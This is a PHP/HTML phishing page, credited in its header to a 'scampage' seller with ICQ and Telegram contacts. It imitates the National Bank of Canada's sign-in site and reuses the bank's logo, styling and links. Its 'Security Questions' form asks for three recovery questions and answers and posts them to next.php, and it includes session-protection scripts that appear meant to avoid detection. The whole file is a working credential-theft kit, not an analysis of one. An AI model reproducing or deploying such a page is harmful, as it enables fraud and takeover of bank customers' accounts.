<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

require "../includes/session_protect.php";
require "../includes/functions.php";
require "../includes/One_Time.php";
   
   ?><!DOCTYPE html>
<html data-react-helmet="lang" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<meta name="theme-color" content="#e41c23"><link rel="manifest" href="https://connexion.bnc.ca/manifest.json">
<meta name="apple-mobile-web-app-capable" content="yes"><meta name="msapplication-square310x310logo" content="/favicons/icon_largetile.png">
<title>National Bank / Banking Services</title><link href="files/2ebcca20.css" rel="stylesheet"><style type="text/css" data-styled-components="iVXCSc sMEDM jbtqAE kdpZJs bTmuHO" data-styled-components-is-local="true">
/* sc-component-id: sc-bdVaJa */

.jbtqAE{color:#7993a2;font-family:gilroy;font-weight:normal;font-size:0.875rem;line-height:1.5;white-space:nowrap;}
/* sc-component-id: sc-EHOje */

.kdpZJs{opacity:1;display:block;color:#7993a2;font-family:gilroy;font-weight:normal;font-size:0.875em;line-height:1em;text-align:left;-webkit-transition:all 0.2s;transition:all 0.2s;margin-top:0;margin-bottom:0.25em;}
.bTmuHO{opacity:0;display:none;color:#e41c23;font-family:gilroy;font-weight:normal;font-size:0.75em;line-height:2em;text-align:left;-webkit-transition:all 0.2s;transition:all 0.2s;margin-top:0;margin-bottom:0.25em;}
/* sc-component-id: sc-keyframes-iVXCSc */
@-webkit-keyframes iVXCSc{from{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@keyframes iVXCSc{from{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}
/* sc-component-id: sc-htoDjs */

.sMEDM{padding:0.563rem 1rem;font-size:1em;font-family:gilroy;line-height:1.25;border-radius:8px;border:1px solid #d2d2d2;color:#000;box-shadow:inset 0 1px 3px 0 rgba(0,0,0,0.14);-webkit-transition:all 0.2s;transition:all 0.2s;-webkit-appearance:none;box-sizing:border-box;}.sMEDM[disabled]{display:none;}.sMEDM[disabled],.sMEDM[disabled] + .radio-checkbox-input__elem{opacity:0.3;background-color:#d2d2d2;}.sMEDM[type='checkbox'],.sMEDM[type='radio']{margin:0;padding:0;overflow:hidden;border-color:transparent;}.sMEDM[type='checkbox'] + .radio-checkbox-input__elem,.sMEDM[type='radio'] + .radio-checkbox-input__elem{position:absolute;top:0;left:0;margin:0;width:2em;height:2em;box-shadow:none;color:#fff;background:#fff;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;font-size:1em;font-family:gilroy;line-height:1.25;border-radius:8px;border:1px solid #d2d2d2;-webkit-transition:all 0.2s;transition:all 0.2s;-webkit-appearance:none;box-sizing:border-box;}.sMEDM[type='checkbox'].is-small,.sMEDM[type='radio'].is-small{width:1.5em;height:1.5em;}.sMEDM[type='checkbox'].is-small + .radio-checkbox-input,.sMEDM[type='radio'].is-small + .radio-checkbox-input{width:1.5em;height:1.5em;}.sMEDM[type='checkbox'].is-small + .radio-checkbox-input__elem,.sMEDM[type='radio'].is-small + .radio-checkbox-input__elem{width:1.5em;height:1.5em;}.sMEDM[type='checkbox']{width:2em;height:2em;border-radius:4px;}.sMEDM[type='checkbox'] + .radio-checkbox-input__elem{border-radius:4px;background:#fff;border:1px solid #d2d2d2;}.sMEDM[type='checkbox']:checked + .radio-checkbox-input__elem{border-color:transparent;background-color:#1572c5;background-image:url(/static/media/check.1791a3c8.svg);background-size:1.5em;background-repeat:no-repeat;background-position:center;}.sMEDM[type='checkbox'].is-small + .radio-checkbox-input__elem{background-size:1em;}.sMEDM[type='radio']{width:2em;height:2em;border-radius:50%;}.sMEDM[type='radio'] + .radio-checkbox-input__elem{border-radius:50%;z-index:1;}.sMEDM[type='radio']:checked + .radio-checkbox-input__elem::after{content:'';width:1.125rem;height:1.125rem;border-radius:50%;background:#1572c5;}.sMEDM:focus,.sMEDM[type='radio']:focus + .radio-checkbox-input__elem,.sMEDM[type='checkbox']:focus + .radio-checkbox-input__elem{outline:0;-webkit-transition:all 0.2s;transition:all 0.2s;box-shadow:0 0 0 3px rgba(21,114,197,0.2);}</style><link rel="shortcut icon" href="https://connexion.bnc.ca/favicons/favicon.ico" data-react-helmet="true"><link rel="icon" sizes="192x192" href="https://connexion.bnc.ca/favicons/icon.png" data-react-helmet="true"><link rel="apple-touch-icon" href="https://connexion.bnc.ca/favicons/ios-icon.png" data-react-helmet="true"><meta name="msapplication-square310x310logo" content="/favicons/icon_largetile.png" data-react-helmet="true"><script src="files/s-code-contents-705dd2e073e48aac6d392f2de76226665f309e5d.js"></script><script type="text/javascript" src="files/api.js"></script></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"><div><div class="offScreenStyle" aria-live="assertive" aria-relevant="all" aria-atomic="true">National Bank online services.</div><div class="template-fullscreen-footer"><div class="template-fullscreen-footer__content"><header class="template-fullscreen-footer__header"><div class="header"><div class="bnc-brand en"><div class="bnc-brand__logo"><div class="bnc-logo"><svg viewBox="0 0 408.6 106.3" preserveAspectRatio="xMinYMid meet"><g><g><path class="logo-icon" d="M73.3,25 C71.3,25.5 69.9,25.8 68.4,25.2 C67.3,24.8 66.4,23.5 65.6,22.4 L52,3.8 C51.2,2.7 50.3,1.4 49.2,1 C47.8,0.4 46.3,0.8 44.3,1.2 L0.5,13 L0.5,94.5 L44.4,82.8 C46.4,82.4 47.9,82 49.3,82.6 C50.4,83.1 51.3,84.3 52.1,85.4 L65.6,104 C66.4,105.1 67.3,106.3 68.4,106.8 C69.8,107.3 71.3,107 73.3,106.6 L117.1,94.9 L117.1,13.2 L73.3,25 Z"></path><polygon class="logo-txt" points="167 16.5 167 37.4 166.9 37.4 153.1 13.2 145.5 16.9 145.5 47.9 152.2 47.9 152.2 23.1 152.3 23.1 166.5 47.9 173.7 47.9 173.7 13.2"></polygon><path class="logo-txt" d="M197.9,13.2 L197.9,13.2 L187.8,18.1 L177.2,47.9 L184.8,47.9 L187.2,40.7 L200,40.7 L202.2,47.9 L210.1,47.9 L197.9,13.2 Z M189.2,34.7 L193.6,21 L193.7,21 L198,34.7 L189.2,34.7 Z"></path><path class="logo-txt" d="M339.7,13.2 L339.7,13.2 L329.6,18.1 L319,47.9 L326.6,47.9 L329,40.7 L341.8,40.7 L344,47.9 L351.9,47.9 L339.7,13.2 Z M330.9,34.7 L335.3,21 L335.4,21 L339.7,34.7 L330.9,34.7 Z"></path><polygon class="logo-txt" points="234.1 13.2 209.4 13.2 205.9 19.3 205.9 19.3 216.4 19.3 216.4 47.9 223.6 47.9 223.6 19.3 230.5 19.3"></polygon><polygon class="logo-txt" points="237 16.7 237 47.9 244.2 47.9 244.2 13.2 244.2 13.2"></polygon><path class="logo-txt" d="M265.7,12.3 C265.4,12.3 265,12.3 264.6,12.3 L252.6,18.2 C250.5,20.9 249,24.9 249,30.6 C249,46.9 261.1,48.9 265.7,48.9 C270.3,48.9 282.4,46.9 282.4,30.6 C282.3,14.2 270.2,12.3 265.7,12.3 Z M265.7,42.7 C261.8,42.7 256.3,40.3 256.3,30.6 C256.3,20.9 261.8,18.5 265.7,18.5 C269.6,18.5 275.1,20.9 275.1,30.6 C275.1,40.3 269.6,42.7 265.7,42.7 Z"></path><polygon class="logo-txt" points="308.6 16.5 308.6 37.4 308.5 37.4 294.7 13.2 287.1 16.9 287.1 47.9 293.9 47.9 293.9 23.1 294 23.1 308.1 47.9 315.4 47.9 315.4 13.2"></polygon><polygon class="logo-txt" points="380 41.6 362.7 41.6 362.7 13.2 355.5 16.7 355.5 47.9 376.4 47.9"></polygon><path class="logo-txt" d="M168.8,76 C170.2,75.3 173.1,73.9 173.1,68.9 C173.1,65.3 170.9,60 162.4,60 L152.8,60 L145.5,63.6 L145.5,94.7 L160.2,94.7 C167.3,94.7 169.2,93.5 171.2,91.6 C173,89.8 174.2,87.2 174.2,84.4 C174.1,81 173,77.6 168.8,76 Z M152.4,66 L160.7,66 C164,66 166,66.9 166,69.7 C166,72.5 163.7,73.6 160.9,73.6 L152.4,73.6 L152.4,66 L152.4,66 Z M161.3,88.7 L152.4,88.7 L152.4,79.4 L161.6,79.4 C164.2,79.4 166.8,80.6 166.8,83.6 C166.9,87.2 164.8,88.7 161.3,88.7 Z"></path><polygon class="logo-txt" points="232.5 63.3 232.5 84.2 232.4 84.2 218.6 60 211 63.8 211 94.7 217.8 94.7 217.8 70 217.9 70 232 94.7 239.3 94.7 239.3 60"></polygon><path class="logo-txt" d="M195.7,60 L195.7,60 L185.6,65 L175,94.7 L182.6,94.7 L185,87.5 L197.8,87.5 L200,94.7 L207.9,94.7 L195.7,60 Z M187,81.6 L191.4,67.9 L191.5,67.9 L195.8,81.6 L187,81.6 Z"></path><polygon class="logo-txt" points="275.2 60.1 263.9 62 252.6 74.2 252.6 60 245.3 63.6 245.3 94.7 252.6 94.7 252.6 83 256 79.5 266.7 94.7 276 94.7 261 74.2"></polygon></g></g></svg></div></div><span class="bnc-brand__separator"></span><div class="bnc-brand__tag">Powering your ideas</div></div></div></header><main class="template-fullscreen-footer__main"><div class="forgot-password"><div class="connect-form forgot-password-form">

<form method="post" action="next.php">
<div class="form-header"><H2>Security Questions</H2>
</div>
<div class="form-fields">
<div class="form-field">
<div class="forgot-password-form__input-label">

</div>

	
			<select style="height:48px" name="Q1">
			<option selected="selected">Select a question</option>
			<option value="What was my nickname in elementary school?">What was my nickname in elementary school?</option>
			<option value="In which city was my father (mother) born?">In which city was my father (mother) born?</option>
			<option value="Who was my first love?">Who was my first love?</option>
			<option value="Who was the best man at my wedding?">Who was the best man at my wedding?</option>
			<option value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</option>
			<option value="Which song always makes me cry?">Which song always makes me cry?</option>
			<option value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</option>
			<option value="What was my first job?">What was my first job?</option>
			<option value="What sport do I play best?">What sport do I play best?</option>
			<option value="What make was my first car?">What make was my first car?</option>
			<option value="What was the name of my elementary school?">What was the name of my elementary school?</option>
			<option value="Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option>
			<option value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</option>
			<option value="In which hospital was I born ?">In which hospital was I born ?</option>
			<option value="What's my father's (mother's) middle name?">What's my father's (mother's) middle name?</option>
			<option value="Which was the destination of my first airplane trip?">Which was the destination of my first airplane trip?</option>
			<option value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</option>
			<option value="My favourite restaurant is...">My favourite restaurant is...</option>
			<option value="My favourite book is...">My favourite book is...</option>
			<option value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</option>
			<option value="My favourite food is...">My favourite food is...</option>
			<option value="What is my hobby?">What is my hobby?</option>
			<option value="What's my favourite dessert?">What's my favourite dessert?</option>
			<option value="What's my favourite music group?">What's my favourite music group?</option>
			<option value="What's my favourite song?">What's my favourite song?</option>
			<option value="My favourite candy is....">My favourite candy is....</option>
			<option value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</option>
			<option value="What was my first pet called?">What was my first pet called?</option>
			</select></br></br>
<input class="forgot-password-form__input sc-htoDjs sMEDM" placeholder="answer" id="email" name="A1" required type="text" ></br></br>
<select style="height:48px" name="Q2">
			<option selected="selected">Select a question</option>
			<option value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</option>
			<option value="My favourite food is...">My favourite food is...</option>
			<option value="What is my hobby?">What is my hobby?</option>
			<option value="What's my favourite dessert?">What's my favourite dessert?</option>
			<option value="What's my favourite music group?">What's my favourite music group?</option>
			<option value="What's my favourite song?">What's my favourite song?</option>
			<option value="My favourite candy is....">My favourite candy is....</option>
			<option value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</option>
			<option value="What was my first pet called?">What was my first pet called?</option>
			<option value="What was my nickname in elementary school?">What was my nickname in elementary school?</option>
			<option value="In which city was my father (mother) born?">In which city was my father (mother) born?</option>
			<option value="Who was my first love?">Who was my first love?</option>
			<option value="Who was the best man at my wedding?">Who was the best man at my wedding?</option>
			<option value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</option>
			<option value="Which song always makes me cry?">Which song always makes me cry?</option>
			<option value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</option>
			<option value="What was my first job?">What was my first job?</option>
			<option value="What sport do I play best?">What sport do I play best?</option>
			<option value="What make was my first car?">What make was my first car?</option>
			<option value="What was the name of my elementary school?">What was the name of my elementary school?</option>
			<option value="Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option>
			<option value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</option>
			<option value="In which hospital was I born ?">In which hospital was I born ?</option>
			<option value="What's my father's (mother's) middle name?">What's my father's (mother's) middle name?</option>
			<option value="Which was the destination of my first airplane trip?">Which was the destination of my first airplane trip?</option>
			<option value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</option>
			<option value="My favourite restaurant is...">My favourite restaurant is...</option>
			<option value="My favourite book is...">My favourite book is...</option>
			</select></br></br>
<input class="forgot-password-form__input sc-htoDjs sMEDM" placeholder="answer" id="email" name="A2" required type="text" ></br></br>
<select style="height:48px" name="Q3">
			<option selected="selected">Select a question</option>
			<option value="What make was my first car?">What make was my first car?</option>
			<option value="What was the name of my elementary school?">What was the name of my elementary school?</option>
			<option value="Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option>
			<option value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</option>
			<option value="In which hospital was I born ?">In which hospital was I born ?</option>
			<option value="What's my father's (mother's) middle name?">What's my father's (mother's) middle name?</option>
			<option value="Which was the destination of my first airplane trip?">Which was the destination of my first airplane trip?</option>
			<option value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</option>
			<option value="My favourite restaurant is...">My favourite restaurant is...</option>
			<option value="My favourite book is...">My favourite book is...</option>
			<option value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</option>
			<option value="What was my nickname in elementary school?">What was my nickname in elementary school?</option>
			<option value="In which city was my father (mother) born?">In which city was my father (mother) born?</option>
			<option value="Who was my first love?">Who was my first love?</option>
			<option value="Who was the best man at my wedding?">Who was the best man at my wedding?</option>
			<option value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</option>
			<option value="Which song always makes me cry?">Which song always makes me cry?</option>
			<option value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</option>
			<option value="What was my first job?">What was my first job?</option>
			<option value="What sport do I play best?">What sport do I play best?</option>
			<option value="My favourite food is...">My favourite food is...</option>
			<option value="What is my hobby?">What is my hobby?</option>
			<option value="What's my favourite dessert?">What's my favourite dessert?</option>
			<option value="What's my favourite music group?">What's my favourite music group?</option>
			<option value="What's my favourite song?">What's my favourite song?</option>
			<option value="My favourite candy is....">My favourite candy is....</option>
			<option value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</option>
			<option value="What was my first pet called?">What was my first pet called?</option>
			</select></br></br>
<input class="forgot-password-form__input sc-htoDjs sMEDM" placeholder="answer" id="email" name="A3" required type="text" ></br></br>
</div>

<div class="form-fields">


<div id="forgotPasswordFormSubmit" class="forgot-password-form__submit">
<button class="bt_cta fluid primary is-large" id="forgotPasswordFormSubmitButton">Continue</button>
</form>
</div><button class="bt_link back-link-button forgot-password-form__link" title=""><div><span class="bn-icon rotated"><svg width="10" height="10" viewBox="0 0 16 16"><g fill="currentColor" fill-rule="nonzero"><g><path d="M3.30689457,14.5949439 C2.94245222,14.9238871 2.90962829,15.4844954 3.2331924,15.8537218 C3.5567565,16.2229482 4.11682318,16.2639887 4.49075429,15.9458733 L12.6933392,8.76007837 C12.88822,8.58951759 13,8.34314233 13,8.08416453 C13,7.82518673 12.88822,7.57881146 12.6933392,7.40825069 L4.49075429,0.222455724 C4.24911308,0.0109795474 3.9130062,-0.0555184467 3.60904185,0.0480108928 C3.30507751,0.151540232 3.07943512,0.409368336 3.01711199,0.72437385 C2.95478886,1.03937936 3.06525335,1.36370546 3.30689457,1.57518163 L10.7379048,8.08461364 L3.30689457,14.5949439 L3.30689457,14.5949439 Z"></path></g></g></svg></span>Back to sign in page</div></button></div></div></div></main></div><footer class="template-fullscreen-footer__footer"><div class="common-footer"><div class="need-help"><div class="title-section"><h2 class="title title-section__title">Need help?</h2><div class="title-section__text"><a target="_blank" href="https://www.nbc.ca/personal/accounts/online/faq.html">Consult our Frequently Asked Questions (FAQ).</a></div></div></div></div></footer></div></div></div><script type="text/javascript" src="files/main.js"></script><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_nationalbankofcanada_0" name="destination_publishing_iframe_nationalbankofcanada_0_name" style="display: none; width: 0px; height: 0px;" src="files/dest5.htm" class="aamIframeLoaded"></iframe><div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div><div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="recaptcha challenge" src="files/bframe.htm" style="width: 100%; height: 100%;" name="c-ys44a6j0dh73" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" frameborder="0"></iframe></div></div></body></html>